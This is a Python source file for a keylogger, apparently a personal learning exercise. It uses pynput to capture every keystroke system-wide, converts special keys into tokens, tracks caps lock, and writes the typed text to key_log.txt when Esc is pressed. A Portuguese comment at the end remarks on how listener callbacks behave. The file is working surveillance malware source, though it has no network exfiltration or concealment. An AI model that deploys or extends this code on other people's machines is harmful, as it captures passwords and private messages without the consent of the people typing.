from pynput.keyboard import Key, Listener
import logging

#Global variables
log_dir = ""
arr = []
case = 1

#Creating the log file
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(message)s')

#Class to handle possible exceptions
class MyException(Exception) : pass

#Function to handle the press events
def on_press(key):
    global case
    key = str(key).replace("'","")
    if key == 'Key.space':
       arr.append(" ")
    elif key == 'Key.enter':
       arr.append('\n')
    elif key == 'Key.backspace':
       arr.pop()
    elif key == 'Key.ctrl':
       pass
    elif key == 'Key.shift_r' or key == 'Key.shift_l':
       pass
    elif key == 'Key.esc':
       return False 
    elif key == 'Key.tab':
       arr.append('[TAB]')
    elif key == 'Key.alt':
       arr.append('[ALT]')
    elif key == 'Key.down':
       arr.append('[DOWN]')
    elif key == 'Key.up':
       arr.append('[UP]')
    elif key == 'Key.right':
       arr.append('[RIGHT]')
    elif key == 'Key.left':
       arr.append('[LEFT]')
    elif key == 'Key.caps_lock':
       case = not case
    else:
       arr.append(key) if case else arr.append(key.upper()) 

#Function to write all the information to the log file 
def final(s):
    logging.info('{0}'.format(s))

if __name__ == "__main__":
    with Listener(on_press=on_press) as listener:
        try : 
            listener.join()
        except MyException as e :
            pass
        finally :
            final(''.join(arr)) 

"""
Aparentemente sempre quando as funções de callback retornarm nada ou True o lister.join continua
"""
